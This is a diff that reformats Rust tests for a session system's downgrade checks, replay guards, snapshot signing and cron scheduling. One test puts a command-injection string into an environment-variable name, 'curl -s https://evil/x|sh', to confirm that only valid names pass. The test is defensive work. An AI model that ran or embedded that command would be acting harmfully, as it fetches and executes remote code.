@@ -17,14 +17,37 @@ use std::sync::atomic::Ordering;
 fn a_downgrade_signs_only_the_stores_asked_for() {
     let (core, enc, sig) = (new_key(), new_key(), new_key());
     let m = json!({"id": "m1", "encryptionKey": enc.public(), "signingKey": sig.public()});
-    let ch = |stores: &[&str]| core.doc(&json!({"kind": "challenge", "request": {"downgrade": true, "stores": stores, "machine": m}}));
+    let ch = |stores: &[&str]| {
+        core.doc(&json!({"kind": "challenge", "request": {"downgrade": true, "stores": stores, "machine": m}}))
+    };
     let keep = vec!["default".to_string()];
-    let check = |d| crate::downgrade::check_downgrade_challenge(&core.public(), Some(&d), "m1", &enc.public(), &sig.public(), &keep);
-    assert!(check(ch(&["default", "prod"])).is_err(), "signed a downgrade that keeps a store the session dropped");
-    check(ch(&["default"])).unwrap();
-    let cert = core.doc(&json!({"kind": "succession-cert", "stores": ["default", "prod"], "machine": m}));
+    let check = |d| {
+        crate::downgrade::check_downgrade_challenge(
+            &core.public(),
+            Some(&d),
+            "m1",
+            &enc.public(),
+            &sig.public(),
+            &keep,
+        )
+    };
     assert!(
-        crate::downgrade::check_downgrade_cert(&core.public(), Some(&cert), "m1", &enc.public(), &sig.public(), &keep).is_err(),
+        check(ch(&["default", "prod"])).is_err(),
+        "signed a downgrade that keeps a store the session dropped"
+    );
+    check(ch(&["default"])).unwrap();
+    let cert =
+        core.doc(&json!({"kind": "succession-cert", "stores": ["default", "prod"], "machine": m}));
+    assert!(
+        crate::downgrade::check_downgrade_cert(
+            &core.public(),
+            Some(&cert),
+            "m1",
+            &enc.public(),
+            &sig.public(),
+            &keep
+        )
+        .is_err(),
         "took a new cert that still names a dropped store"
     );
 }
@@ -35,7 +58,13 @@ fn secrets_take_only_env_names() {
     let e = TestEnv::new();
     let held = &crate::secrets::HELD;
     held.set(HashMap::from(
-        [("GOOD", "it's"), ("X=1;curl -s https://evil/x|sh;Y", "v"), ("1BAD", "v"), ("a b", "v")].map(|(k, v)| (k.to_string(), v.to_string())),
+        [
+            ("GOOD", "it's"),
+            ("X=1;curl -s https://evil/x|sh;Y", "v"),
+            ("1BAD", "v"),
+            ("a b", "v"),
+        ]
+        .map(|(k, v)| (k.to_string(), v.to_string())),
     ));
     let got = held.snapshot();
     held.set(HashMap::new());
@@ -44,11 +73,32 @@ fn secrets_take_only_env_names() {
 }
 
 fn wakeup(k: &Tkey, body: &str) -> Delivery {
-    Delivery { kind: "wakeup".into(), request: Some(signed_request(k, "m1", "POST", "/m/api/sessions/s/wakeup", body.as_bytes())), ..Default::default() }
+    Delivery {
+        kind: "wakeup".into(),
+        request: Some(signed_request(
+            k,
+            "m1",
+            "POST",
+            "/m/api/sessions/s/wakeup",
+            body.as_bytes(),
+        )),
+        ..Default::default()
+    }
 }
 
 fn cron(k: &Tkey, body: &str) -> Delivery {
-    Delivery { kind: "cron".into(), run: 1, request: Some(signed_request(k, "m1", "POST", "/m/api/sessions/s/crons", body.as_bytes())), ..Default::default() }
+    Delivery {
+        kind: "cron".into(),
+        run: 1,
+        request: Some(signed_request(
+            k,
+            "m1",
+            "POST",
+            "/m/api/sessions/s/crons",
+            body.as_bytes(),
+        )),
+        ..Default::default()
+    }
 }
 
 const NOW: i64 = 1791700000;
@@ -60,16 +110,28 @@ fn a_wakeup_is_delivered_once_and_a_cron_once_per_run() {
     let k = new_key();
     let w = wakeup(&k, r#"{"prompt":"release"}"#);
     not_replayed(&w, NOW).unwrap();
-    assert!(not_replayed(&w, NOW + 3600).is_err(), "a one-time wakeup was delivered twice");
+    assert!(
+        not_replayed(&w, NOW + 3600).is_err(),
+        "a one-time wakeup was delivered twice"
+    );
     let mut cr = cron(&k, r#"{"prompt":"p","everySeconds":3600}"#);
     not_replayed(&cr, NOW).unwrap();
-    assert!(not_replayed(&cr, NOW + 7200).is_err(), "a cron run was delivered twice");
+    assert!(
+        not_replayed(&cr, NOW + 7200).is_err(),
+        "a cron run was delivered twice"
+    );
     cr.run = 2;
     let r = not_replayed(&cr, NOW + 600);
-    assert!(r.as_ref().is_err_and(|e| format!("{e:#}").contains("half")), "a cron ran far faster than its period: {r:?}");
+    assert!(
+        r.as_ref().is_err_and(|e| format!("{e:#}").contains("half")),
+        "a cron ran far faster than its period: {r:?}"
+    );
     not_replayed(&cr, NOW + 3600).unwrap();
     // the record travels in the snapshot, so a successor refuses the same repeats
-    assert!(SNAPSHOT_PATHS.contains(&DELIVERED_FILE), "the delivered record isn't in the snapshot");
+    assert!(
+        SNAPSHOT_PATHS.contains(&DELIVERED_FILE),
+        "the delivered record isn't in the snapshot"
+    );
 }
 
 /// Finding: the router could keep an early signed snapshot and kill with it later (a rollback). The machine signs one
@@ -85,13 +147,19 @@ fn the_machine_signs_one_final_snapshot() {
     std::fs::write(e.home.join("workspace/a"), "one").unwrap();
     upload_snapshot(&c).unwrap();
     let froze = TEST_FREEZE.lock().unwrap().unwrap().0;
-    assert!(froze == 1 && FROZEN.load(Ordering::SeqCst), "the session wasn't stopped before its snapshot");
+    assert!(
+        froze == 1 && FROZEN.load(Ordering::SeqCst),
+        "the session wasn't stopped before its snapshot"
+    );
     // work after it (if anything still ran) never reaches a second signed snapshot
     std::fs::write(e.home.join("workspace/a"), "two").unwrap();
     upload_snapshot(&c).unwrap();
     let commits = fr.lock().unwrap().commits.clone();
     let froze = TEST_FREEZE.lock().unwrap().unwrap().0;
-    assert!(commits.len() == 2 && commits[0] == commits[1] && froze == 1, "a second, different snapshot was signed: {commits:?} (froze {froze})");
+    assert!(
+        commits.len() == 2 && commits[0] == commits[1] && froze == 1,
+        "a second, different snapshot was signed: {commits:?} (froze {froze})"
+    );
     // and nothing is delivered or run into a stopped session
     assert!(not_frozen().is_err(), "a stopped session takes input");
 }
@@ -106,7 +174,10 @@ fn a_wakeup_the_harness_refused_is_not_burned() {
     replay_guard(&w, NOW, false).unwrap();
     replay_guard(&w, NOW + 5, false).expect("a wakeup the harness refused counts as delivered");
     replay_guard(&w, NOW + 5, true).unwrap();
-    assert!(replay_guard(&w, NOW + 60, false).is_err(), "a delivered wakeup passes the check again");
+    assert!(
+        replay_guard(&w, NOW + 60, false).is_err(),
+        "a delivered wakeup passes the check again"
+    );
 }
 
 /// 2026-11-17: schedule-wakeup.sh armed every cron with a fractional period ("everySeconds":1800.0, Python's float).
@@ -118,7 +189,11 @@ fn a_cron_armed_with_a_fractional_period_runs_again() {
     let mut cr = cron(&new_key(), r#"{"prompt":"p","everySeconds":1800.0}"#);
     not_replayed(&cr, NOW).unwrap();
     cr.run = 2;
-    not_replayed(&cr, NOW + 1800).expect("run 2 of a 30-minute cron, 30 minutes later, was refused");
+    not_replayed(&cr, NOW + 1800)
+        .expect("run 2 of a 30-minute cron, 30 minutes later, was refused");
     cr.run = 3;
-    assert!(not_replayed(&cr, NOW + 2400).is_err(), "a 30-minute cron ran 10 minutes after its last run");
+    assert!(
+        not_replayed(&cr, NOW + 2400).is_err(),
+        "a 30-minute cron ran 10 minutes after its last run"
+    );
 }
